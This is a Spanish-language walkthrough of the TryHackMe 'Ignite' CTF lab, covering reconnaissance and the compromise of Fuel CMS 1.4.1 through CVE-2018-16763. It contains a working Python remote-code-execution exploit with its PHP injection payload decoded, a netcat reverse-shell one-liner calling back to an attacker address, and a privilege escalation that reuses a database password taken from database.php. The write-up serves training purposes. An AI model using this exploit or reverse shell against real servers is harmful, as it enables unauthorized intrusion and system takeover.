# 🔥 TryHackMe - Ignite CTF Writeup

## 📝 Introducción

En este writeup de TryHackMe Ignite, se explotó una vulnerabilidad de ejecución remota de código (RCE) en Fuel CMS versión 1.4.1 (CVE-2018-16763). El objetivo es obtener acceso de ejecución de comandos en el sistema objetivo, comprender el funcionamiento del exploit e identificar formas de defenderse contra este tipo de vulnerabilidades. Este tutorial no solo explica cómo obtener acceso de ejecución remota de comandos, sino también cómo escalar privilegios mediante la reutilización de credenciales a través de credenciales de aplicación mal configuradas para lograr acceso root.

---

## 🎯 Información de la Máquina

- **Plataforma:** TryHackMe
- **Nombre:** Ignite
- **Dificultad:** Fácil
- **IP Objetivo:** 10.10.222.86

---

## 🚀 Paso 1: Verificación de Conectividad (Ping)

### Descripción
Antes de comenzar con el reconocimiento activo, verificamos que tenemos conectividad con la máquina objetivo mediante el comando `ping`.

<img width="683" height="314" alt="Ping" src="https://github.com/user-attachments/assets/c7312991-a212-4c11-8a39-83974b319d21" />

### Comando Ejecutado
````bash
ping -c 4 10.10.222.86
````

### Resultado
````bash
PING 10.10.222.86 (10.10.222.86) 56(84) bytes of data.
64 bytes from 10.10.222.86: icmp_seq=1 ttl=63 time=44.9 ms
64 bytes from 10.10.222.86: icmp_seq=2 ttl=63 time=45.4 ms
64 bytes from 10.10.222.86: icmp_seq=3 ttl=63 time=44.3 ms
64 bytes from 10.10.222.86: icmp_seq=4 ttl=63 time=52.4 ms

--- 10.10.222.86 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 44.346/46.744/52.362/3.263 ms
`````

### Análisis 🔍
- ✅ **Conectividad:** Confirmada (4 paquetes enviados, 4 recibidos, 0% pérdida)
- ⏱️ **Latencia promedio:** 46.744 ms
- 🐧 **TTL = 63:** Indica que se trata de un sistema **Linux** (el TTL inicial es 64, y ha pasado por un router)

**Conclusión:** La máquina objetivo está activa y responde correctamente. Podemos proceder con el escaneo de puertos y enumeración de servicios.

---

## 🔍 Paso 2: Escaneo de Puertos con Nmap

### Descripción
Realizamos un escaneo de puertos completo con Nmap para identificar los servicios que están ejecutándose en la máquina objetivo. Utilizamos parámetros agresivos para obtener la máxima información posible.

<img width="1466" height="501" alt="Nmap" src="https://github.com/user-attachments/assets/033508f6-cdc9-486b-8685-4136173f67d0" />

### Comando Ejecutado
````bash
nmap -p- -sV -sC --open -min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.222.86
````

#### Parámetros utilizados:
- `-p-`: Escanea todos los puertos (1-65535)
- `-sV`: Detección de versión de servicios
- `-sC`: Ejecuta scripts por defecto de Nmap
- `--open`: Muestra solo puertos abiertos
- `-min-rate 5000`: Envía al menos 5000 paquetes por segundo
- `-vvv`: Modo muy verbose (triple verbosidad)
- `-n`: No resuelve DNS
- `-Pn`: Omite el descubrimiento de host (asume que está activo)
- `-oN escaneo`: Guarda el resultado en formato normal

### Resultado
````bash
Nmap 7.94SVN scan initiated Tue Nov 18 21:16:33 2025
Nmap scan report for 10.10.222.86
Host is up, received user-set (0.053s latency).
Scanned at 2025-11-18 21:16:34 CET for 30s
Not shown: 39574 closed tcp ports (conn-refused), 25960 filtered tcp ports (no-response)

PORT STATE SERVICE REASON VERSION
80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))
|http-title: Welcome to FUEL CMS
| http-methods:
| Supported Methods: GET HEAD POST OPTIONS
|http-robots.txt: 1 disallowed entry
|/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed.

Nmap done at Tue Nov 18 21:17:04 2025 -- 1 IP address (1 host up) scanned in 31.17 seconds
````
### Análisis 🔍

#### Puertos Abiertos:
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 80/tcp | open   | HTTP     | Apache httpd 2.4.18 (Ubuntu) |

#### Información Relevante:
- 🌐 **Servicio Web:** Apache 2.4.18 ejecutándose en Ubuntu
- 📄 **Título HTTP:** "Welcome to FUEL CMS"
- 🤖 **robots.txt:** Entrada denegada en `/fuel/`
- 🔧 **Métodos HTTP:** GET, HEAD, POST, OPTIONS soportados
- 🔥 **CMS Identificado:** FUEL CMS

### Conclusión 🎯
Solo hay un puerto abierto (80/tcp) ejecutando un servidor web Apache con **FUEL CMS**. El archivo `robots.txt` revela un directorio interesante: `/fuel/`, que probablemente sea el panel de administración. El siguiente paso será enumerar el servicio web y buscar vulnerabilidades conocidas en FUEL CMS.

---

## 🌐 Paso 3: Inspección del Servicio Web (Puerto 80)

### Descripción
Accedemos al servicio web en el puerto 80 para identificar la aplicación y su versión. Confirmamos que se trata de FUEL CMS y recopilamos información visible en la página principal.

### Acceso
````html
http://10.10.222.86/
````


### Hallazgos 🔍

#### Información Principal:
- 🔥 **Aplicación identificada:** Fuel CMS
- 📌 **Versión detectada:** Version 1.4
- 📄 **Página de bienvenida:** "Welcome to Fuel CMS"

<img width="1490" height="897" alt="Pag puerto 80" src="https://github.com/user-attachments/assets/7144100a-85eb-489c-9a2b-6dd4d607bb3a" />

#### Contenido de la Página:
La página principal muestra una guía de inicio "Getting Started" con instrucciones de configuración, incluyendo:

1. **Change the Apache .htaccess file**
   - Mención de la ruta por defecto: `RewriteBase /FUEL-CMS-master/`
   - Configuración de RewriteRule para index.php

⚠️ **Nota importante:** La página incluye un mensaje que indica: *"This is the only step needed if you want to use FUEL without the CMS"*

### Análisis 🎯

La versión **Fuel CMS 1.4** está expuesta públicamente. Esta versión es conocida por tener vulnerabilidades críticas, específicamente:

- 🚨 **CVE-2018-16763**: Remote Code Execution (RCE)
- 🔓 **Severidad:** Crítica
- 💥 **Impacto:** Ejecución remota de código sin autenticación

### Conclusión 💡

Hemos confirmado que el objetivo está ejecutando **Fuel CMS versión 1.4**, una versión vulnerable a RCE. El siguiente paso será buscar exploits públicos disponibles para esta vulnerabilidad y verificar si podemos explotarla para obtener acceso al sistema.

---

## 📂 Paso 4: Enumeración de Directorios con Gobuster

### Descripción
Utilizamos Gobuster para enumerar directorios y archivos accesibles en el servidor web. Esto nos ayudará a descubrir rutas ocultas y archivos de configuración importantes.

### Comando Ejecutado
````bash
gobuster dir -u http://10.10.222.86/ -w /usr/share/wordlists/dirb/common.txt
````

<img width="862" height="481" alt="gobuster" src="https://github.com/user-attachments/assets/bc5ab96a-7be4-41e0-84c5-90367a16aaee" />


### Análisis 🔍

Archivos y directorios interesantes encontrados:
- 📄 **/README.md** (Status: 200) - Archivo de documentación accesible
- 🤖 **/robots.txt** (Status: 200) - Archivo de control de crawlers
- 📁 **/assets/** (Status: 301) - Directorio de recursos
- 🏠 **/home** (Status: 200) - Página principal
- 📑 **/index.php** (Status: 200) - Punto de entrada

### Conclusión 💡
El archivo **README.md** está accesible públicamente y podría contener información valiosa sobre la instalación, configuración o versión del CMS.

---

## 📖 Paso 5: Lectura del Archivo README.md

### Descripción
Accedemos al archivo README.md descubierto en el paso anterior para obtener información adicional sobre la aplicación y su configuración.

### Acceso
````bash
http://10.10.222.86/README.md
````

<img width="987" height="674" alt="leemos el README" src="https://github.com/user-attachments/assets/da6e8f5c-6928-48d9-916e-7c6c7654db40" />


### Contenido Relevante 🔍

#### Información del CMS:
````bash
FUEL CMS
FUEL CMS is a CodeIgniter based content management system.
To learn more about its features visit: http://www.getfuelcms.com
````

#### Detalles de Versión:
````bash
Upgrade
If you have a current installation and are wanting to upgrade, there are a few
things to be aware of FUEL 1.4 uses CodeIgniter 3.x which includes a number of
changes, the most prominent being the capitalization of controller and model names.
````

**Confirmación:** La aplicación usa **FUEL 1.4** con CodeIgniter 3.x

#### Información Adicional:
- 📚 **Documentación:** http://docs.getfuelcms.com
- 🐛 **Reporte de bugs:** http://github.com/daylightstudio/FUEL-CMS/issues
- 📜 **Licencia:** Apache 2
- 👨‍💻 **Desarrollador:** David McReynolds (Daylight Studio)

### Análisis 🎯

El README confirma:
1. ✅ **FUEL CMS versión 1.4** con CodeIgniter 3.x
2. 📦 Instalación estándar sin configuraciones personalizadas aparentes
3. 🔗 Referencias a repositorio de GitHub oficial
4. ⚠️ Menciona cambios importantes en la estructura (capitalización de controladores)

### Conclusión 💡

Hemos confirmado definitivamente que estamos frente a **FUEL CMS 1.4**, una versión conocida por ser vulnerable a **Remote Code Execution (CVE-2018-16763)**. El siguiente paso será buscar exploits públicos disponibles para esta vulnerabilidad específica.

---

## 🔎 Paso 6: Búsqueda de Exploits en Exploit-DB

### Descripción
Buscamos exploits públicos disponibles para FUEL CMS 1.4.1 utilizando la base de datos de Exploit-DB. Esta base contiene vulnerabilidades documentadas y código de explotación verificado.

<img width="1451" height="398" alt="buscamos exploit para fuel 1 4" src="https://github.com/user-attachments/assets/644541fd-8614-4a79-96ae-49b9d5c00960" />

### Exploit Encontrado 🎯

**Fuel CMS 1.4.1 - Remote Code Execution (3)**

| Campo | Valor |
|-------|-------|
| **EDB-ID** | 50477 |
| **CVE** | 2018-16763 |
| **Author** | PADSALA TRUSHAL |
| **Type** | WEBAPPS |
| **Platform** | PHP |
| **Date** | 2021-11-03 |
| **EDB Verified** | ✗ (No verificado oficialmente) |

### Análisis 🔍

- 🚨 **Vulnerabilidad:** Remote Code Execution (RCE)
- 💥 **Severidad:** Crítica - Permite ejecución remota de comandos
- 🐍 **Lenguaje:** Python (exploit automatizado)
- 📥 **Disponibilidad:** Descargable desde Exploit-DB
- 🔓 **Autenticación:** No requiere credenciales previas

### Conclusión 💡

Hemos identificado un exploit funcional (EDB-ID: 50477) para la vulnerabilidad CVE-2018-16763. Este exploit nos permitirá ejecutar comandos de forma remota en el servidor sin necesidad de autenticación.

---

## 🛠️ Paso 7: Creación y Configuración del Exploit

### Descripción
Descargamos el exploit desde Exploit-DB y lo adaptamos para nuestro objetivo. El exploit está escrito en Python y permite inyectar comandos a través de una vulnerabilidad en el módulo de páginas de FUEL CMS.

<img width="792" height="439" alt="creamos el exploit" src="https://github.com/user-attachments/assets/aa716b25-a953-47fa-8123-9403099adf58" />

### Código del Exploit (exploit.py)

````python
import requests
import urllib.parse

url = "http://10.10.222.86"

def find_nth_overlapping(haystack, needle, n):
start = haystack.find(needle)
while start >= 0 and n > 1:
start = haystack.find(needle, start+1)
n -= 1
return start

while 1:
xxxx = input('cmd: ')
burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
r = requests.get(burp0_url)

html = "<!DOCTYPE html>"
htmlcharset = r.text.find(html)

begin = r.text[0:20]
dup = find_nth_overlapping(r.text, begin, 2)
print(r.text[0:dup])
````

### Configuración ⚙️

Parámetros del exploit:
- 🌐 **URL objetivo:** `http://10.10.222.86`
- 🔧 **Módulo vulnerable:** `/fuel/pages/select/`
- 💉 **Vector de inyección:** Parámetro `filter` con payload codificado
- 🎯 **Función explotada:** `system()` de PHP

### Funcionamiento del Exploit 📋

1. El exploit codifica el comando usando `urllib.parse.quote()`
2. Construye una URL maliciosa que inyecta código PHP
3. La inyección ejecuta `system('comando')` en el servidor
4. Captura y muestra la salida del comando ejecutado

### Análisis del Payload 🔍

El payload codificado en la URL:
`````bash
%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27[comando]%27%29%2b%27
``````

Decodificado:
````text
'+pi(print($a='system'))+$a('[comando]')+'
````

Este payload:
- ✅ Cierra la comilla inicial con `'`
- ✅ Asigna la función `system` a la variable `$a`
- ✅ Ejecuta `$a('comando')` = `system('comando')`
- ✅ Cierra la inyección correctamente

### Conclusión 💡

El exploit está listo para ejecutarse. Utilizaremos este script para obtener ejecución remota de comandos en el servidor y comenzar la fase de explotación activa.

---

## 💥 Paso 8: Explotación y Obtención de Reverse Shell

### Descripción
Ejecutamos el exploit para obtener ejecución remota de comandos y posteriormente establecemos una reverse shell para tener acceso interactivo al sistema objetivo.

### Preparación del Listener 🎧

Primero, configuramos un listener con Netcat en nuestra máquina atacante:
````bash
nc -lvnp 7896
````

### Ejecución del Exploit con Reverse Shell 🔄

Ejecutamos el exploit y enviamos un payload de reverse shell:

````bash
python3 exploit.py
````
**Comando inyectado:**
````bash
cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.4.97 7896 >/tmp/f
````

#### Desglose del Payload:
1. `rm /tmp/f` - Elimina el archivo temporal si existe
2. `mkfifo /tmp/f` - Crea un named pipe (FIFO)
3. `cat /tmp/f|sh -i 2>&1` - Lee del pipe y ejecuta shell interactiva
4. `nc 10.9.4.97 7896 >/tmp/f` - Redirige conexión al atacante

### Verificación del Usuario 🔍

Una vez dentro del sistema, verificamos nuestra identidad:
````bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
````

**Usuario obtenido:** `www-data`

### Enumeración Inicial 📂

Exploramos el directorio actual y la estructura del sistema:
````bash
$ ls
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$
````

✅ **Shell mejorada** con Python para mejor interactividad

<img width="1861" height="378" alt="ejecutamos el exploit con nc escuchando y con un revsere chell" src="https://github.com/user-attachments/assets/9c24106e-25a5-43cd-94e3-9850f12abbe7" />

### Análisis 🎯

- ✅ Acceso remoto obtenido exitosamente
- 👤 Usuario actual: **www-data** (servicio web)
- 📁 Ubicación: `/var/www/html`
- 🔓 Shell interactiva establecida

### Conclusión 💡

Hemos comprometido exitosamente el servidor y obtenido acceso como usuario `www-data`. El siguiente paso es buscar la flag de usuario y enumerar el sistema para posibles vectores de escalada de privilegios.

---

## 🚩 Paso 9: Obtención de la Flag de Usuario

### Descripción
Navegamos por el sistema de archivos para localizar la flag de usuario, típicamente ubicada en el directorio home de algún usuario del sistema.

### Enumeración de Directorios 🔍
````bash
www-data@ubuntu:/var/www/html$ cd /home
cd /home

www-data@ubuntu:/home$ ls
ls
www-data

www-data@ubuntu:/home$ cd www-data
cd www-data

www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
````
### Lectura de la Flag 🎯
````bash
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e[REDACTED]
````

<img width="650" height="307" alt="obtenemos flag de user" src="https://github.com/user-attachments/assets/f14ca119-a517-4a53-b046-7775b4424e7f" />

### Flag de Usuario Obtenida ✅

---

## 🔍 Paso 10: Enumeración de Archivos de Configuración

### Descripción
Realizamos enumeración de archivos de configuración de FUEL CMS en busca de credenciales que puedan ayudarnos en la escalada de privilegios. Los archivos de configuración suelen contener contraseñas de base de datos y otros secretos.

<img width="834" height="250" alt="buscamos el arhicvo database" src="https://github.com/user-attachments/assets/e43d572c-ec05-4311-8a8e-c8abf4c6812b" />

### Navegación al Directorio de Configuración 📂

````bash
www-data@ubuntu:/home/www-data$ cd /var/www/html/fuel/application/config
cd /var/www/html/fuel/application/config

www-data@ubuntu:/var/www/html/fuel/application/config$ ls
ls
MY_config.php constants.php google.php profiler.php
MY_fuel.php custom_fields.php hooks.php redirects.php
MY_fuel_layouts.php database.php index.html routes.php
MY_fuel_modules.php doctypes.php memcached.php smileys.php
asset.php editors.php migration.php social.php
autoload.php environments.php mimes.php states.php
config.php foreign_chars.php model.php user_agents.php

````

### Archivos Identificados 🎯

Archivos de interés para escalada de privilegios:
- 🗄️ **database.php** - Contiene credenciales de base de datos
- ⚙️ **config.php** - Configuración general de la aplicación
- 🔧 **MY_config.php** - Configuración personalizada
- 🔑 **MY_fuel.php** - Configuración específica de FUEL CMS

### Referencia a la Documentación 📖

Recordamos la información de la página de instalación que vimos anteriormente:

<img width="1088" height="324" alt="volvemos a la pagina donde nos explicaba la instalcion de rutas de la bbdd" src="https://github.com/user-attachments/assets/7935e509-a3fe-4898-9e27-d20b75b64138" />

**"Install the database"**

> Install the FUEL CMS database by first creating the database in MySQL and then importing the **fuel/install/fuel_schema.sql** file. After creating the database, change the database configuration found in **fuel/application/config/database.php** to include your hostname (e.g. localhost), username, password and the database to match the new database you created.

### Análisis 🔍

El archivo `database.php` es crítico porque contiene:
- 🏠 **Hostname** de la base de datos
- 👤 **Username** para acceso a MySQL
- 🔐 **Password** de la base de datos
- 📊 **Nombre de la base de datos**

⚠️ **Importancia:** Las credenciales de base de datos frecuentemente se reutilizan para:
- Acceso SSH
- Acceso a otros usuarios del sistema
- Cuentas de administrador
- Panel de administración del CMS

### Conclusión 💡

Hemos identificado el archivo `database.php` como objetivo principal. El siguiente paso será leer su contenido para extraer las credenciales almacenadas y probar si estas pueden ser reutilizadas para escalar privilegios en el sistema.

---

## 🔐 Paso 11: Extracción de Credenciales desde database.php

### Descripción
Leemos el contenido del archivo `database.php` para extraer las credenciales de la base de datos. Este archivo contiene información sensible que podría ser reutilizada para acceder a otros servicios o usuarios del sistema.

<img width="796" height="603" alt="leemos el archivo y estaba el password de root" src="https://github.com/user-attachments/assets/0abf73d4-4371-4cb0-bdbe-f91ab71b5496" />

### Lectura del Archivo 📄
````bash
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
````

### Credenciales Encontradas 🎯

````bash
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
'dsn' => '',
'hostname' => 'localhost',
'username' => 'root',
'password' => 'mememe',
'database' => 'fuel_schema',
'dbdriver' => 'mysqli',
'dbprefix' => '',
'pconnect' => FALSE,
'db_debug' => (ENVIRONMENT !== 'production'),
'cache_on' => FALSE,
'cachedir' => '',
'char_set' => 'utf8',
'dbcollat' => 'utf8_general_ci',
'swap_pre' => '',
'encrypt' => FALSE,
'compress' => FALSE,
'stricton' => FALSE,
'failover' => array(),
'save_queries' => TRUE
);
````

### Credenciales Extraídas 🔑

| Parámetro | Valor |
|-----------|-------|
| **Hostname** | localhost |
| **Username** | root |
| **Password** | mememe |
| **Database** | fuel_schema |
| **Driver** | mysqli |

### Análisis Crítico ⚠️

🚨 **Vulnerabilidad detectada:** Reutilización de credenciales

La configuración muestra:
- 👤 **Usuario de BD:** `root`
- 🔐 **Contraseña:** `mememe`
- ⚠️ **Mala práctica:** Usar el usuario root de MySQL
- 🎯 **Vector de ataque:** Posible reutilización de esta contraseña para el usuario root del sistema

### Hipótesis de Explotación 💡

Es común que los administradores reutilicen contraseñas simples. Intentaremos:
1. Usar `mememe` como contraseña del usuario root del sistema
2. Si funciona, obtendremos privilegios máximos

### Conclusión 🎯

Hemos obtenido credenciales de la base de datos. El siguiente paso será intentar escalar privilegios usando `su root` con la contraseña encontrada (`mememe`).

---

## 🔓 Paso 12: Escalada de Privilegios a Root

### Descripción
Utilizamos las credenciales encontradas en el archivo de configuración para intentar cambiar al usuario root del sistema. Esta es una técnica común cuando se reutilizan contraseñas.

### Escalada de Privilegios 👑

<img width="779" height="235" alt="elevamos privilegios y obtenemos flag root" src="https://github.com/user-attachments/assets/4c7a05c4-610f-4fe1-9f97-fc6501abe8a7" />

````bash
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# id
id
uid=0(root) gid=0(root) groups=0(root)
````

✅ **¡Acceso root obtenido exitosamente!**

### Verificación de Usuario 🔍

````bash
root@ubuntu:/var/www/html/fuel/application/config# whoami
whoami
root
````

### Obtención de la Flag de Root 🚩

Navegamos al directorio home de root:

````bash
root@ubuntu:/var/www/html/fuel/application/config# cd /root
cd /root

root@ubuntu:~# ls
ls
root.txt

root@ubuntu:~# cat /root/root.txt
cat /root/root.txt
b9bbcb[REDACTED]
````
### Flags Obtenida 🏆

---












